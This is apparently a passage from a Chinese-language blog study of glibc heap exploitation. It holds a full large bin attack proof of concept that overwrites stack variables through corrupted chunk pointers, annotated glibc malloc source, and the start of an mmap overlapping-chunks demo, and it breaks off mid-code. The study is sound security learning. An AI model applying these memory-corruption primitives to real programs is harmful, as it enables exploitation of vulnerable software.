<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220627233517402.png"></p>
<p>&#x3D;&#x3D;》calloc将获得fake_chunk</p>
<h3 id="large-bin-attack-c"><a href="#large-bin-attack-c" class="headerlink" title="large_bin_attack.c"></a>large_bin_attack.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;assert.h></span></span>
 
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This file demonstrates large bin attack by writing a large unsigned long value into stack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"In practice, large bin attack is generally prepared for further attacks, such as rewriting the "</span>
           <span class="token string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's first look at the targets we want to rewrite on stack:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"stack_var1 (%p): %ld\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var1<span class="token punctuation">,</span> stack_var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"stack_var2 (%p): %ld\n\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var2<span class="token punctuation">,</span> stack_var2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now, we allocate the first large chunk on the heap at: %p\n"</span><span class="token punctuation">,</span> p1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span>
           <span class="token string">" the first large chunk during the free()\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Then, we allocate the second large chunk on the heap at: %p\n"</span><span class="token punctuation">,</span> p2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span>
           <span class="token string">" the second large chunk during the free()\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finally, we allocate the third large chunk on the heap at: %p\n"</span><span class="token punctuation">,</span> p3 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"And allocate another fastbin chunk in order to avoid consolidating the top chunk with"</span>
           <span class="token string">" the third large chunk during the free()\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We free the first and second large chunks now and they will be inserted in the unsorted bin:"</span>
           <span class="token string">" [ %p &lt;--> %p ]\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"</span>
            <span class="token string">" freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"</span>
            <span class="token string">", and reinsert the remaining of the freed first large chunk into the unsorted bin:"</span>
            <span class="token string">" [ %p ]\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1 <span class="token operator">+</span> <span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now, we free the third large chunk and it will be inserted in the unsorted bin:"</span>
           <span class="token string">" [ %p &lt;--> %p ]\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p3 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token comment">//------------VULNERABILITY-----------</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""</span>
            <span class="token string">" as well as its \"bk\" and \"bk_nextsize\" pointers\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"</span>
            <span class="token string">" at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"</span>
            <span class="token string">" \"bk_nextsize\" to 32 bytes before stack_var2\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    p2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3f1</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var2 <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//------------------------------------</span>

    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."</span>
            <span class="token string">" During this time, targets should have already been rewritten:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"stack_var1 (%p): %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>stack_var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"stack_var2 (%p): %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>stack_var2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// sanity check</span>
    <span class="token function">assert</span><span class="token punctuation">(</span>stack_var1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">assert</span><span class="token punctuation">(</span>stack_var2 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请chunk：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628112804337.png"></p>
<p>释放p1，p2：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628112852637.png"></p>
<p>申请0x90的chunk：</p>
<p>首先将unsorted bin中的chunk并入large bin中</p>
<p>再从large bin中切割chunk</p>
<p>从large bin头开始遍历，首先到最小的p1&#x3D;&#x3D;》切割p1，剩余的p1置于unsorted bin</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628113457796.png"></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628113539934.png"></p>
<p><strong>重点：</strong></p>
<p>切割large bin chunk：</p>
<p>binmap：通过比特位记录哪些bins当前存有chunk</p>
<pre class="language-c" data-language="c"><code class="language-c">  <span class="token operator">++</span>idx<span class="token punctuation">;</span>
  bin <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
  block <span class="token operator">=</span> <span class="token function">idx2block</span> <span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//寻找对应索引idx的比特位信息再哪个索引中</span>
  map <span class="token operator">=</span> av<span class="token operator">-></span>binmap<span class="token punctuation">[</span>block<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">//定位索引对应的无符号整型变量</span>
  bit <span class="token operator">=</span> <span class="token function">idx2bit</span> <span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//定位该idx的比特位</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token comment">/* Skip rest of block if there are no more set bits in this block.  */</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>bit <span class="token operator">></span> map <span class="token operator">||</span> bit <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
          <span class="token comment">//当前map中没有满足的chunk或bit溢出</span>
        <span class="token punctuation">&#123;</span>
          <span class="token keyword">do</span>
            <span class="token punctuation">&#123;</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">++</span>block <span class="token operator">>=</span> BINMAPSIZE<span class="token punctuation">)</span> <span class="token comment">/* out of bins */</span>
                <span class="token keyword">goto</span> use_top<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
          <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>map <span class="token operator">=</span> av<span class="token operator">-></span>binmap<span class="token punctuation">[</span>block<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          bin <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> <span class="token punctuation">(</span>block <span class="token operator">&lt;&lt;</span> BINMAPSHIFT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          bit <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

      <span class="token comment">/* Advance to bin with set bit. There must be one. */</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bit <span class="token operator">&amp;</span> map<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
          <span class="token comment">//bit应该是0x100，0x10000，0x1000000这类数</span>
          <span class="token comment">//与map做按位与处理判断某位是否位1</span>
        <span class="token punctuation">&#123;</span>
          bin <span class="token operator">=</span> <span class="token function">next_bin</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">;</span>
          bit <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>
          <span class="token function">assert</span> <span class="token punctuation">(</span>bit <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

      <span class="token comment">/* Inspect the bin. It is likely to be non-empty */</span>
      victim <span class="token operator">=</span> <span class="token function">last</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//检查是否为空</span>

      <span class="token comment">/*  If a false alarm (empty bin), clear the bit. */</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">==</span> bin<span class="token punctuation">)</span>  <span class="token comment">//若为空==》前面的比特位有误，将其清除后重新循环判断</span>
        <span class="token punctuation">&#123;</span>
          av<span class="token operator">-></span>binmap<span class="token punctuation">[</span>block<span class="token punctuation">]</span> <span class="token operator">=</span> map <span class="token operator">&amp;=</span> <span class="token operator">~</span>bit<span class="token punctuation">;</span> <span class="token comment">/* Write through */</span>
          bin <span class="token operator">=</span> <span class="token function">next_bin</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">;</span>
          bit <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

      <span class="token keyword">else</span>
          <span class="token comment">//有chunk存在</span>
        <span class="token punctuation">&#123;</span>
          size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//选择最后一个chunk获取其size</span>

          <span class="token comment">/*  We know the first chunk in this bin is big enough to use. */</span>
          <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token comment">//断言这个size大于请求的size</span>

          remainder_size <span class="token operator">=</span> size <span class="token operator">-</span> nb<span class="token punctuation">;</span>
          <span class="token comment">//计算切割该chunk后剩余的大小remainder_size</span>

          <span class="token comment">/* unlink */</span>
          <span class="token function">unlink</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token comment">//unlink将该chunk从bins中取出</span>

          <span class="token comment">/* Exhaust */</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>remainder_size <span class="token operator">&lt;</span> MINSIZE<span class="token punctuation">)</span>
              <span class="token comment">//判断remainder_size是否小于0x20</span>
              <span class="token comment">//若是==》直接将整个chunk全部分配出来</span>
            <span class="token punctuation">&#123;</span>
              <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span>
                  <span class="token function">set_non_main_arena</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

          <span class="token comment">/* Split */</span>
          <span class="token keyword">else</span>
            <span class="token punctuation">&#123;</span>
              remainder <span class="token operator">=</span> <span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token comment">//获取分割后的chunk头地址</span>

              <span class="token comment">/* We cannot assume the unsorted list is empty and therefore
                 have to perform a complete insert here.  */</span>
              bck <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>
              fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>
			  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>fwd<span class="token operator">-></span>bk <span class="token operator">!=</span> bck<span class="token punctuation">)</span><span class="token punctuation">)</span>
			    <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): corrupted unsorted chunks 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token comment">//从这开始将该切割后剩余chunk插入到unsorted bin的头指针之后</span>
              remainder<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
              remainder<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
              bck<span class="token operator">-></span>fd <span class="token operator">=</span> remainder<span class="token punctuation">;</span>
              fwd<span class="token operator">-></span>bk <span class="token operator">=</span> remainder<span class="token punctuation">;</span>

              <span class="token comment">/* advertise as last remainder */</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span>
                  <span class="token comment">//如果为small bin大小的chunk</span>
                  <span class="token comment">//设置last_remainder为chunk本身</span>
                av<span class="token operator">-></span>last_remainder <span class="token operator">=</span> remainder<span class="token punctuation">;</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>remainder_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
                  <span class="token comment">//如果chunk是large bin大小</span>
                  <span class="token comment">//清空fd_nextsize和bk_nextsize</span>
                <span class="token punctuation">&#123;</span>
                  remainder<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
                  remainder<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
              <span class="token function">set_head</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb <span class="token operator">|</span> PREV_INUSE <span class="token operator">|</span>
                        <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena <span class="token operator">?</span> NON_MAIN_ARENA <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token function">set_head</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token function">set_foot</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
          <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> p<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
</code></pre>

<p>&#x3D;&#x3D;&#x3D;》在两个chunk被链入large bin后，会选择较小的那个（靠近bin）chunk进行切割</p>
<p>释放p3：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628113807603.png"></p>
<p>对p2进行修改：</p>
<p>未修改前：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628113923128.png"></p>
<p>修改后：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628114019581.png"></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628114035061.png"></p>
<p>此时再申请0x90的chunk：</p>
<p>1、首先判断是否切割last_remainder</p>
<p>&#x3D;&#x3D;》切割条件：</p>
<p>last_remainder存在</p>
<p>申请的大小在small bin范围</p>
<p>该last_remainder是unsorted bin中唯一一个chunk</p>
<p>这个last_remainder的大小要大于（申请大小+最小chunk大小0x20）</p>
<p>2、此时last_remainder并不唯一，unsorted bin中还有p3</p>
<p>&#x3D;&#x3D;&#x3D;》首先将p1（0x3f0）放入small bin</p>
<p>&#x3D;》p3放入large bins，与p2一个bins</p>
<p>&#x3D;&#x3D;》</p>
<p>未并入large bin：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220628163100805.png"></p>
<p>p2-&gt;bk-&gt;fd &#x3D; stack1</p>
<p>p2-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; stack2</p>
<p><strong>并入：</strong></p>
<pre class="language-c" data-language="c"><code class="language-c">	victim_index <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
    bck <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
    fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>

	victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
    victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>
<span class="token comment">//victim->bk_nextsize = stack2-0x20</span>
    fwd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
    victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
<span class="token comment">//stack2 = victim</span>

	bck <span class="token operator">=</span> fwd<span class="token operator">-></span>bk<span class="token punctuation">;</span>
<span class="token comment">//bck = stack1-0x10</span>

	victim<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
<span class="token comment">//victim->bk = stack1-0x10</span>
    victim<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
    fwd<span class="token operator">-></span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>
    bck<span class="token operator">-></span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span>
<span class="token comment">//stack1 = victim</span></code></pre>

<p>&#x3D;&#x3D;》p3为victim，p2为fwd</p>
<p>&#x3D;&#x3D;&#x3D;》两个栈区都被修改为p3的地址</p>
<h3 id="mmap-overlapping-chunks-c"><a href="#mmap-overlapping-chunks-c" class="headerlink" title="mmap_overlapping_chunks.c"></a>mmap_overlapping_chunks.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token comment">/*
Technique should work on all versions of GLibC
Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`

POC written by POC written by Maxwell Dulin (Strikeout) 
*/</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

	<span class="token keyword">int</span><span class="token operator">*</span> ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Extremely large chunks are special because they are allocated in their own mmaped section\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"of memory, instead of being put onto the normal heap.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"=======================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocating three extremely large heap chunks of size 0x100000 \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		
	<span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> top_ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The first mmap chunk goes directly above LibC: %p\n"</span><span class="token punctuation">,</span>top_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// After this, all chunks are allocated downwards in memory towards the heap.</span>
	<span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> mmap_chunk_2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The second mmap chunk goes below LibC: %p\n"</span><span class="token punctuation">,</span> mmap_chunk_2<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> mmap_chunk_3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The third mmap chunk goes below the second mmap chunk: %p\n"</span><span class="token punctuation">,</span> mmap_chunk_3<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nCurrent System Memory Layout \n"</span> \
<span class="token string">"================================================\n"</span> \
<span class="token string">"running program\n"</span> \
<span class="token string">"heap\n"</span> \
